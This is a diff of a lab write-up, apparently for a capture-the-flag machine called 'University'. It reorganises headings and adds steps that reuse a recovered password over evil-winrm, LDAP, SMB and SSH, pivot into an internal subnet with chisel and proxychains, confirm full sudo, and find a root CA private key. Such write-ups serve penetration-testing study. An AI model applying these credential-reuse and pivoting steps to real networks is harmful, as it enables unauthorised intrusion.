@@ -315,9 +315,9 @@ $7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"
 Invoke-Expression -Command $7zCommand
 ```
 
-### 2.4. Exploring with found credentials
+## 3. Exploring with found credentials
 
-#### 2.4.1. Attempt connection
+### 3.1. Attempt connection
 
 ```console
 root@kali:~# evil-winrm -u 'WAO' -p 'WebAO1337' -i 10.10.11.39
@@ -333,7 +333,7 @@ Info: Establishing connection to remote endpoint
 university\wao
 ```
 
-#### 2.4.2. Scan for users
+### 3.2. Scan for users
 
 ```console
 root@kali:~# netexec ldap 10.10.11.39 -u wao -p WebAO1337 --users
@@ -369,7 +369,7 @@ LDAP        10.10.11.39     389    DC               Martin.T                    
 LDAP        10.10.11.39     389    DC               William.B                     2024-02-28 07:20:12 0       Remote Volume Manager
 ```
 
-### 2.5. Checking for other points of access
+## 3.3. Checking for other points of access
 
 The network configuration reveals that the target is attached to a vSwitch in the `192.168.99.0/24` subnet
 
@@ -407,9 +407,9 @@ PS C:\Users\WAO\Documents> cmd /c "for /L %i in (1,1,255) do @ping -n 1 -w 1 192
 192.168.99.12 is up.
 ```
 
-### 2.6. Investigate new live targets found in the subnet
+## 4. Investigate the new found targets
 
-#### 2.6.1. Establish dynamic port proxy to pivot to the subnet
+### 4.1. Establish dynamic port proxy to pivot to the subnet
 
 Start chisel listener on Kali
 
@@ -454,15 +454,15 @@ Kali should show connected:
 Edit `/etc/proxychains4.conf` to change default `tor` setting to the chisel socks proxy
 
 ```console
-root@kali:~# sed -i 's/socks4  127.0.0.1 9050/socks5  127.0.0.1 1080/' /etc/proxychains4.conf
+root@kali:~# sed -i '/^socks4/s/9050/1080/' /etc/proxychains4.conf
 
 root@kali:~# sed -i '/^socks4/s/socks4/socks5/' /etc/proxychains4.conf
 
-root@kali:~# grep "^socks5" /etc/proxychains4.conf
+root@kali:~# grep ^socks5 /etc/proxychains4.conf
 socks5  127.0.0.1 1080
 ```
 
-#### 2.6.2. Port Scan `nmap` on the found live targets
+### 4.2. Enumeration on the new found targets
 
 > [!Tip]
 >
@@ -471,7 +471,7 @@ socks5  127.0.0.1 1080
 > 3. Use `-O -sV -sC` instead of `-A` to omit running traceroute
 > 4. nmap scan would be quite slow over ProxyChains, use `-F` to limit the port range to top 100 ports
 
-##### 192.168.99.2
+#### 4.2.1. 192.168.99.2
 
 ```console
 root@kali:~# proxychains -q nmap -Pn -sT -O -sV -sC -F 192.168.99.2
@@ -500,7 +500,71 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 157.72 seconds
 ```
 
-##### 192.168.99.12
+`445` found on `192.168.99.2`, scan with nmap smb scripts:
+
+```console
+root@kali:~# proxychains -q nmap -Pn -sT -p445 --script smb-* 192.168.99.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 08:23 +08
+Nmap scan report for 192.168.99.2
+Host is up (0.017s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
+
+Host script results:
+|_smb-flood: ERROR: Script execution failed (use -d to debug)
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
+| smb-protocols:
+|   dialects:
+|     2:0:2
+|     2:1:0
+|     3:0:0
+|     3:0:2
+|_    3:1:1
+| smb-mbenum:
+|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
+|_smb-print-text: false
+|_smb-vuln-ms10-054: false
+
+Nmap done: 1 IP address (1 host up) scanned in 42.94 seconds
+```
+
+`wao` has access to the target over SMB, but no permissions on the shares
+
+```console
+root@kali:~# proxychains -q crackmapexec smb 192.168.99.2 -u wao -p WebAO1337 --shares
+SMB         192.168.99.2    445    WS-3             [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS-3) (domain:university.htb) (signing:False) (SMBv1:False)
+SMB         192.168.99.2    445    WS-3             [+] university.htb\wao:WebAO1337
+SMB         192.168.99.2    445    WS-3             [+] Enumerated shares
+SMB         192.168.99.2    445    WS-3             Share           Permissions     Remark
+SMB         192.168.99.2    445    WS-3             -----           -----------     ------
+SMB         192.168.99.2    445    WS-3             ADMIN$                          Remote Admin
+SMB         192.168.99.2    445    WS-3             C$                              Default share
+SMB         192.168.99.2    445    WS-3             IPC$            READ            Remote IPC
+```
+
+WinRM was not scanned in nmap as it's not one of the top 100 ports in `-F` option
+
+Just trying to connect with `evil-winrm` using `wao` credentials worked
+
+```console
+root@kali:~# proxychains -q evil-winrm -u 'WAO' -p 'WebAO1337' -i 192.168.99.2
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\wao\Documents> whoami
+university\wao
+*Evil-WinRM* PS C:\Users\wao\Documents> hostname
+WS-3
+```
+
+#### 4.2.2. 192.168.99.12
 
 ```console
 root@kali:~# proxychains -q nmap -Pn -sT -O -sV -sC -F 192.168.99.12
@@ -520,4 +584,104 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds
+```
+
+Attempt to ssh using `wao` credentials worked
+
+```console
+root@kali:~# proxychains -q ssh wao@192.168.99.12
+Warning: Permanently added '192.168.99.12' (ED25519) to the list of known hosts.
+--------------------------[!]WARNING[!]-----------------------------
+|This LAB is created for web app features testing purposes ONLY....|
+|Please DO NOT leave any critical information while this machine is|
+|       accessible by all the "Web Developers" as sudo users       |
+--------------------------------------------------------------------
+wao@192.168.99.12's password:
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+Last login: Mon Oct 21 17:11:58 2024 from 192.168.99.1
+wao@LAB-2:~$ id
+uid=1001(wao) gid=1001(wao) groups=1001(wao),27(sudo)
+wao@LAB-2:~$ hostname
+LAB-2
+```
+
+`wao` has full sudo rights on the target:
+
+```console
+wao@LAB-2:~$ sudo -l
+[sudo] password for wao:
+Matching Defaults entries for wao on LAB-2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wao may run the following commands on LAB-2:
+    (ALL : ALL) ALL
+```
+
+The `Downloads` directory in `wao`'s home directory appears to be the developer work area for the site, CAs were found in this directory too:
+
+```console
+wao@LAB-2:~$ ls -lRa
+.:
+total 52
+drwxr-xr-x 9 wao  wao  4096 Oct 21 17:09 .
+drwxr-xr-x 5 root root 4096 Sep 14 03:45 ..
+lrwxrwxrwx 1 root root    9 Sep 14 03:48 .bash_history -> /dev/null
+-rw-r--r-- 1 wao  wao   220 Sep 13 11:08 .bash_logout
+-rw-r--r-- 1 wao  wao  3771 Sep 13 11:08 .bashrc
+drwx------ 2 wao  wao  4096 Sep 14 03:55 .cache
+drwx------ 3 wao  wao  4096 Sep 14 07:21 .config
+drwxrwxr-x 2 wao  wao  4096 Sep 14 06:41 Desktop
+drwxrwxr-x 2 wao  wao  4096 Sep 14 06:42 Documents
+drwxrwxr-x 9 wao  wao  4096 Sep 14 03:55 Downloads
+drwx------ 3 wao  wao  4096 Sep 14 03:55 .gnupg
+drwxrwxr-x 3 wao  wao  4096 Sep 14 07:32 .local
+-rw-r--r-- 1 wao  wao   807 Sep 13 11:08 .profile
+-rw-r--r-- 1 root root   66 Oct 21 17:09 .selected_editor
+-rw-r--r-- 1 wao  wao     0 Sep 14 03:58 .sudo_as_admin_successful
+⋮
+
+./Downloads:
+total 60
+drwxrwxr-x 9 wao wao  4096 Sep 14 03:55 .
+drwxr-xr-x 9 wao wao  4096 Oct 21 17:09 ..
+drwxrwxr-x 2 wao wao  4096 Sep 14 03:55 CA
+drwxrwxr-x 2 wao wao  4096 Sep 14 03:55 gunicorn-test
+drwxrwxr-x 2 wao wao  4096 Sep 14 03:55 nginx
+-rwxrwxr-x 1 wao wao 22616 Sep 14 03:55 proto-features.py
+drwxrwxr-x 2 wao wao  4096 Sep 14 03:55 test
+drwxrwxr-x 3 wao wao  4096 Sep 14 03:55 University-Linux
+drwxrwxr-x 5 wao wao  4096 Sep 14 03:55 University-Prototype-23
+drwxrwxr-x 3 wao wao  4096 Sep 14 03:55 University-Windows
+
+./Downloads/CA:
+total 20
+drwxrwxr-x 2 wao wao 4096 Sep 14 03:55 .
+drwxrwxr-x 9 wao wao 4096 Sep 14 03:55 ..
+-rwxrwxr-x 1 wao wao 1399 Sep 14 03:55 rootCA.crt
+-rwxrwxr-x 1 wao wao 1704 Sep 14 03:55 rootCA.key
+-rwxrwxr-x 1 wao wao   42 Sep 14 03:55 rootCA.srl
+⋮
+
+./Downloads/University-Prototype-23:
+total 224
+drwxrwxr-x 5 wao wao   4096 Sep 14 03:55 .
+drwxrwxr-x 9 wao wao   4096 Sep 14 03:55 ..
+drwxrwxr-x 2 wao wao   4096 Sep 14 03:55 CA
+-rwxrwxr-x 1 wao wao 200704 Sep 14 03:55 db.sqlite3
+-rwxrwxr-x 1 wao wao    666 Sep 14 03:55 manage.py
+-rwxrwxr-x 1 wao wao    133 Sep 14 03:55 start-server.bat
+drwxrwxr-x 4 wao wao   4096 Sep 14 03:55 static
+drwxrwxr-x 5 wao wao   4096 Sep 14 03:55 University
+
+./Downloads/University-Prototype-23/CA:
+total 20
+drwxrwxr-x 2 wao wao 4096 Sep 14 03:55 .
+drwxrwxr-x 5 wao wao 4096 Sep 14 03:55 ..
+-rwxrwxr-x 1 wao wao 1399 Sep 14 03:55 rootCA.crt
+-rwxrwxr-x 1 wao wao 1704 Sep 14 03:55 rootCA.key
+-rwxrwxr-x 1 wao wao   42 Sep 14 03:55 rootCA.srl
 ```
